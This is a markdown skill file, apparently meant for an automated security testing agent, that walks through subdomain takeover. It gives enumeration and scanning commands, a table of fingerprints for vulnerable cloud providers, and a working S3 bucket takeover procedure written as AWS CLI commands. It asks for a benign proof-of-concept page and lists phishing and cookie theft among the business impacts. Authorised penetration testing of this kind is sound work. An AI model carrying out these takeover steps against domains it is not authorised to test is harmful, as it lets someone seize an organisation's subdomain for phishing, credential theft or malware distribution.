---
name: subdomain_takeover
description: Subdomain takeover detection and exploitation
applicable_contexts: [dns, cloud, infrastructure]
---

## Subdomain Takeover Testing

### Discovery Phase

```bash
# Enumerate subdomains
subfinder -d TARGET_DOMAIN -all -o /workspace/subdomains.txt
assetfinder --subs-only TARGET_DOMAIN >> /workspace/subdomains.txt
amass enum -d TARGET_DOMAIN -o /workspace/amass.txt

# Probe for CNAME records
cat /workspace/subdomains.txt | dnsx -cname -resp -o /workspace/cnames.txt

# Check for dangling CNAME
cat /workspace/cnames.txt | grep -E '(s3|herokuapp|github|azure|shopify|fastly)'
```

### Vulnerable Cloud Provider Fingerprints

| Provider | CNAME Pattern | Error Indicator |
|----------|---------------|-----------------|
| AWS S3 | `*.s3.amazonaws.com` | "NoSuchBucket" |
| GitHub Pages | `*.github.io` | "There isn't a GitHub Pages site here" |
| Heroku | `*.herokuapp.com` | "No such app" |
| Azure | `*.azurewebsites.net` | "404 Web Site not found" |
| Shopify | `*.myshopify.com` | "Sorry, this shop is currently unavailable" |
| Fastly | `*.fastly.net` | "Fastly error: unknown domain" |
| Pantheon | `*.pantheonsite.io` | "404 error unknown site" |
| Surge.sh | `*.surge.sh` | "project not found" |
| Unbounce | `*.unbouncepages.com` | "The requested URL was not found" |
| Zendesk | `*.zendesk.com` | "Help Center Closed" |

### Automated Detection

```bash
# can-i-take-over-xyz — comprehensive check
nuclei -l /workspace/subdomains.txt \
  -t ~/nuclei-templates/takeovers/ \
  -o /workspace/takeover-candidates.json -json

# subjack
subjack -w /workspace/subdomains.txt -t 100 -timeout 30 \
  -ssl -c /path/to/fingerprints.json -o /workspace/subjack.txt
```

### Exploitation Process

1. Identify dangling CNAME → service returns error page
2. Register/claim the resource on the cloud provider
3. Configure the resource to respond for the target subdomain
4. Verify: the target subdomain now serves attacker-controlled content

### S3 Bucket Takeover Example

```bash
# 1. Confirm bucket doesn't exist
curl https://subdomain.target.com  # → "NoSuchBucket"

# 2. Create bucket with matching name
aws s3 mb s3://subdomain.target.com --region us-east-1

# 3. Upload content
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
aws s3 cp index.html s3://subdomain.target.com/ --acl public-read

# 4. Configure static website hosting
aws s3 website s3://subdomain.target.com --index-document index.html

# 5. Verify
curl https://subdomain.target.com  # → "Subdomain Takeover PoC"
```

### Validation Requirements

- Show dangling DNS record (CNAME pointing to unclaimed resource)
- Demonstrate ability to claim the resource
- Serve custom content on the target subdomain
- Document: domain, CNAME target, cloud provider, claim method
- Do NOT host malicious content — use benign PoC page

### Business Impact

- Phishing from trusted subdomain (bypasses email filters, user trust)
- Cookie theft (if parent domain cookies accessible)
- Authentication bypass (OAuth callbacks, SSO)
- SEO poisoning and reputation damage
- Malware distribution from trusted domain
